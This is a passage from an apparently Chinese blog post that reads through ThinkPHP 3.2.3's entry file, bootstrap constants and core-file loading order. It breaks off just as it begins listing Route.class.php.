<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 应用入口文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测PHP环境</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">version_compare</span>(PHP_VERSION,<span class="string">&#x27;5.3.0&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>))  <span class="keyword">die</span>(<span class="string">&#x27;require PHP &gt; 5.3.0 !&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启调试模式 建议开发阶段开启 部署阶段注释或者设为false</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_DEBUG&#x27;</span>,True);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义应用目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>,<span class="string">&#x27;./Application/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入ThinkPHP入口文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./ThinkPHP/ThinkPHP.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 亲^_^ 后面不需要任何代码了 就是如此简单</span></span><br></pre></td></tr></table></figure>

<p>看到后面引用 <code>./ThinkPHP/ThinkPHP.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------------------</span></span><br><span class="line"><span class="comment">// ThinkPHP公共入口文件</span></span><br><span class="line"><span class="comment">//----------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录开始运行时间</span></span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;_beginTime&#x27;</span>] = <span class="title function_ invoke__">microtime</span>(<span class="literal">TRUE</span>);</span><br><span class="line"><span class="comment">// 记录内存初始使用</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MEMORY_LIMIT_ON&#x27;</span>,<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;memory_get_usage&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(MEMORY_LIMIT_ON) <span class="variable">$GLOBALS</span>[<span class="string">&#x27;_startUseMems&#x27;</span>] = <span class="title function_ invoke__">memory_get_usage</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 版本信息</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">THINK_VERSION</span>     =   <span class="string">&#x27;3.2.3&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URL 模式定义</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">URL_COMMON</span>        =   <span class="number">0</span>;  <span class="comment">//普通模式</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">URL_PATHINFO</span>      =   <span class="number">1</span>;  <span class="comment">//PATHINFO模式</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">URL_REWRITE</span>       =   <span class="number">2</span>;  <span class="comment">//REWRITE模式</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">URL_COMPAT</span>        =   <span class="number">3</span>;  <span class="comment">// 兼容模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类文件后缀</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">EXT</span>               =   <span class="string">&#x27;.class.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统常量定义</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;THINK_PATH&#x27;</span>)   <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;THINK_PATH&#x27;</span>,     <span class="keyword">__DIR__</span>.<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_PATH&#x27;</span>)     <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>,       <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_STATUS&#x27;</span>)   <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_STATUS&#x27;</span>,     <span class="string">&#x27;&#x27;</span>); <span class="comment">// 应用状态 加载对应的配置文件</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_DEBUG&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_DEBUG&#x27;</span>,      <span class="literal">false</span>); <span class="comment">// 是否调试模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;saeAutoLoader&#x27;</span>))&#123;<span class="comment">// 自动识别SAE环境</span></span><br><span class="line">    <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_MODE&#x27;</span>)     <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_MODE&#x27;</span>,      <span class="string">&#x27;sae&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;STORAGE_TYPE&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STORAGE_TYPE&#x27;</span>,  <span class="string">&#x27;Sae&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_MODE&#x27;</span>)     <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_MODE&#x27;</span>,       <span class="string">&#x27;common&#x27;</span>); <span class="comment">// 应用模式 默认为普通模式    </span></span><br><span class="line">    <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;STORAGE_TYPE&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STORAGE_TYPE&#x27;</span>,   <span class="string">&#x27;File&#x27;</span>); <span class="comment">// 存储类型 默认为File    </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;RUNTIME_PATH&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;RUNTIME_PATH&#x27;</span>,   APP_PATH.<span class="string">&#x27;Runtime/&#x27;</span>);   <span class="comment">// 系统运行时目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;LIB_PATH&#x27;</span>)     <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LIB_PATH&#x27;</span>,       <span class="title function_ invoke__">realpath</span>(THINK_PATH.<span class="string">&#x27;Library&#x27;</span>).<span class="string">&#x27;/&#x27;</span>); <span class="comment">// 系统核心类库目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;CORE_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CORE_PATH&#x27;</span>,      LIB_PATH.<span class="string">&#x27;Think/&#x27;</span>); <span class="comment">// Think类库目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;BEHAVIOR_PATH&#x27;</span>)<span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;BEHAVIOR_PATH&#x27;</span>,  LIB_PATH.<span class="string">&#x27;Behavior/&#x27;</span>); <span class="comment">// 行为类库目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;MODE_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;MODE_PATH&#x27;</span>,      THINK_PATH.<span class="string">&#x27;Mode/&#x27;</span>); <span class="comment">// 系统应用模式目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;VENDOR_PATH&#x27;</span>)  <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;VENDOR_PATH&#x27;</span>,    LIB_PATH.<span class="string">&#x27;Vendor/&#x27;</span>); <span class="comment">// 第三方类库目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;COMMON_PATH&#x27;</span>)  <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;COMMON_PATH&#x27;</span>,    APP_PATH.<span class="string">&#x27;Common/&#x27;</span>); <span class="comment">// 应用公共目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;CONF_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CONF_PATH&#x27;</span>,      COMMON_PATH.<span class="string">&#x27;Conf/&#x27;</span>); <span class="comment">// 应用配置目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;LANG_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LANG_PATH&#x27;</span>,      COMMON_PATH.<span class="string">&#x27;Lang/&#x27;</span>); <span class="comment">// 应用语言目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;HTML_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;HTML_PATH&#x27;</span>,      APP_PATH.<span class="string">&#x27;Html/&#x27;</span>); <span class="comment">// 应用静态目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;LOG_PATH&#x27;</span>)     <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOG_PATH&#x27;</span>,       RUNTIME_PATH.<span class="string">&#x27;Logs/&#x27;</span>); <span class="comment">// 应用日志目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;TEMP_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;TEMP_PATH&#x27;</span>,      RUNTIME_PATH.<span class="string">&#x27;Temp/&#x27;</span>); <span class="comment">// 应用缓存目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DATA_PATH&#x27;</span>)    <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATA_PATH&#x27;</span>,      RUNTIME_PATH.<span class="string">&#x27;Data/&#x27;</span>); <span class="comment">// 应用数据目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;CACHE_PATH&#x27;</span>)   <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CACHE_PATH&#x27;</span>,     RUNTIME_PATH.<span class="string">&#x27;Cache/&#x27;</span>); <span class="comment">// 应用模板缓存目录</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;CONF_EXT&#x27;</span>)     <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CONF_EXT&#x27;</span>,       <span class="string">&#x27;.php&#x27;</span>); <span class="comment">// 配置文件后缀</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;CONF_PARSE&#x27;</span>)   <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CONF_PARSE&#x27;</span>,     <span class="string">&#x27;&#x27;</span>);    <span class="comment">// 配置文件解析方法</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ADDON_PATH&#x27;</span>)   <span class="keyword">or</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADDON_PATH&#x27;</span>,     APP_PATH.<span class="string">&#x27;Addon&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统信息</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">version_compare</span>(PHP_VERSION,<span class="string">&#x27;5.4.0&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;magic_quotes_runtime&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;MAGIC_QUOTES_GPC&#x27;</span>,<span class="title function_ invoke__">get_magic_quotes_gpc</span>()? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;MAGIC_QUOTES_GPC&#x27;</span>,<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;IS_CGI&#x27;</span>,(<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(PHP_SAPI,<span class="string">&#x27;cgi&#x27;</span>) || <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(PHP_SAPI,<span class="string">&#x27;fcgi&#x27;</span>)) ? <span class="number">1</span> : <span class="number">0</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;IS_WIN&#x27;</span>,<span class="title function_ invoke__">strstr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>) ? <span class="number">1</span> : <span class="number">0</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;IS_CLI&#x27;</span>,PHP_SAPI==<span class="string">&#x27;cli&#x27;</span>? <span class="number">1</span>   :   <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!IS_CLI) &#123;</span><br><span class="line">    <span class="comment">// 当前文件名</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;_PHP_FILE_&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(IS_CGI) &#123;</span><br><span class="line">            <span class="comment">//CGI/FASTCGI模式下</span></span><br><span class="line">            <span class="variable">$_temp</span>  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">define</span>(<span class="string">&#x27;_PHP_FILE_&#x27;</span>,    <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>],<span class="string">&#x27;&#x27;</span>,<span class="variable">$_temp</span>[<span class="number">0</span>].<span class="string">&#x27;.php&#x27;</span>),<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">define</span>(<span class="string">&#x27;_PHP_FILE_&#x27;</span>,    <span class="title function_ invoke__">rtrim</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;__ROOT__&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$_root</span>  =   <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">dirname</span>(_PHP_FILE_),<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;__ROOT__&#x27;</span>,  ((<span class="variable">$_root</span>==<span class="string">&#x27;/&#x27;</span> || <span class="variable">$_root</span>==<span class="string">&#x27;\\&#x27;</span>)?<span class="string">&#x27;&#x27;</span>:<span class="variable">$_root</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载核心Think类</span></span><br><span class="line"><span class="keyword">require</span> CORE_PATH.<span class="string">&#x27;Think&#x27;</span>.EXT;</span><br><span class="line"><span class="comment">// 应用初始化 </span></span><br><span class="line"><span class="title class_">Think\Think</span>::<span class="title function_ invoke__">start</span>();</span><br></pre></td></tr></table></figure>

<p>这里主要是设置一些环境变量，然后加载<code>require CORE_PATH.&#39;Think&#39;.EXT;</code></p>
<p>核心文件主要是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[&quot;core&quot;]=&gt;</span><br><span class="line">array(11) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(45) &quot;E:\XP\WWW\think\ThinkPHP/Common/functions.php&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(40) &quot;./Application/Common/Common/function.php&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(53) &quot;E:\XP\WWW\think\ThinkPHP\Library/Think/Hook.class.php&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(52) &quot;E:\XP\WWW\think\ThinkPHP\Library/Think/App.class.php&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  string(59) &quot;E:\XP\WWW\think\ThinkPHP\Library/Think/Dispatcher.class.php&quot;</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(54) &quot;E:\XP\WWW\think\ThinkPHP\Library/Think/Route.class.php&quot;</span><br><span class="line">  [6]=&gt;</span><br><span class="line">  string(59) &quot;E:\XP\WWW\think\ThinkPHP\Library/Think/Controller.class.php&quot;</span><br><span class="line">  [7]=&gt;</span><br><span class="line">  string(53) &quot;E:\XP\WWW\think\ThinkPHP\Library/Think/View.class.php&quot;</span><br><span class="line">  [8]=&gt;</span><br><span class="line">  string(69) &quot;E:\XP\WWW\think\ThinkPHP\Library/Behavior/BuildLiteBehavior.class.php&quot;</span><br><span class="line">  [9]=&gt;</span><br><span class="line">  string(73) &quot;E:\XP\WWW\think\ThinkPHP\Library/Behavior/ParseTemplateBehavior.class.php&quot;</span><br><span class="line">  [10]=&gt;</span><br><span class="line">  string(74) &quot;E:\XP\WWW\think\ThinkPHP\Library/Behavior/ContentReplaceBehavior.class.php&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ThinkPHP框架内解析路由的文件在<code>Route.class.php</code>中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span 